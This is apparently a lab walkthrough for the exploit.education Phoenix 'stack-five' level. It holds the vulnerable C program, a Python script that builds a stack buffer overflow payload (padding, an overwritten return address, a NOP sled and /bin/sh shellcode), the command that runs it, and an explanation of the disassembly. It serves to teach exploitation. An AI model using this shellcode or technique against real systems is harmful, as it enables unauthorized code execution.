#Code 

```c

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define BANNER \
  "Welcome to " LEVELNAME ", brought to you by https://exploit.education"

char *gets(char *);

void start_level() {
  char buffer[128];
  gets(buffer);
}

int main(int argc, char **argv) {
  printf("%s\n", BANNER);
  start_level();
}

```
## Script
    
```python
import struct
padding = 'A'*140
eip = struct.pack('<I',0xffffd6fc + 20)
nop = "\x90" * 30
shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
payload = padding + eip + nop + shellcode
print(payload)
```

#### Steps

```bash

(python script.py ; cat ) | /opt/phoenix/i486/stack-five

```

## Explanation

In this level we're meant to perform a bof to execute shellcode injected to the stack of
the binary.
To do this  we'll first take a look at the stack just before `start_level()` returns
the control flow to the `main()` function

```asm
~ disass start_level
Dump of assembler code for function start_level:
   0x08048485 <+0>:     push   ebp
   0x08048486 <+1>:     mov    ebp,esp
   0x08048488 <+3>:     sub    esp,0x88
   0x0804848e <+9>:     sub    esp,0xc
   0x08048491 <+12>:    lea    eax,[ebp-0x88]
   0x08048497 <+18>:    push   eax
   0x08048498 <+19>:    call   0x80482c0 <gets@plt>
   0x0804849d <+24>:    add    esp,0x10
   0x080484a0 <+27>:    nop
   0x080484a1 <+28>:    leave
   0x080484a2 <+29>:    ret
End of assembler dump.

```
Here we can see that the compiler reserves 136 bytes for the buffer, and 12 extra for padding. And also the argument `gets()` will take as 
argument exactly that address `ebp-136`.

So we alredy can guess that we need 136+4 bytes of padding, because 
we also need to surpass the saved EBP to reach the `main()` saved EIP.

Okay, we have a pretty good guess to where to go, but where could the 
EIP go if there is no other function apart from the one's
in the source code.

To answer this, we have to take advantage of the stack itself.
Pointing the EIP to go to an address of the stack that we already 
overrided with our payload.
Let's find out where the stack is in memory

```asm
 info registers
eax            0xffffd670          0xffffd670
ecx            0xfefdff09          0xfefdff09
edx            0x8000              0x8000
ebx            0xf7ffb000          0xf7ffb000
esp            0xffffd6fc          0xffffd6fc <---
```

The address `0xffffd6fc` is where the top of the stack is located,
meaning, if we take the EIP there, it will continue executing
instructions following said direction.


But since this single address can be volatile, we should also 
add a margin of error to guarantee the execution of shellcode.
To do this I'll add 30 bytes of NOPs, better known as a 
NOP slide.

`nop = "\x90" * 30`

Finally, we need to add to our payload the actual assembly instructions
in hex, I used [this shellcode](http://www.shell-storm.org/shellcode/files/shellcode-811.html).

If we just pass the result of the script through STDIN, nothing is likely to happen, the program will start executing and finishing after the first
print. Why is this?

This is because, a shell is waiting to an open STDIN, but after the script is done passing it's result through STDIN, the pipe is closed.
So now the Shell is executed, but it doesn't have any input, because it just closed, so it will just exit.

To overcome this, we can concatenate the python script with `cat`, which is a command that, when it has no parameters, will redirect STDIN to STDOUT. So chaining them together will leave open the STDIN, letting us interact with the shell


```bash

(python script.py ; cat ) | /opt/phoenix/i486/stack-five

```

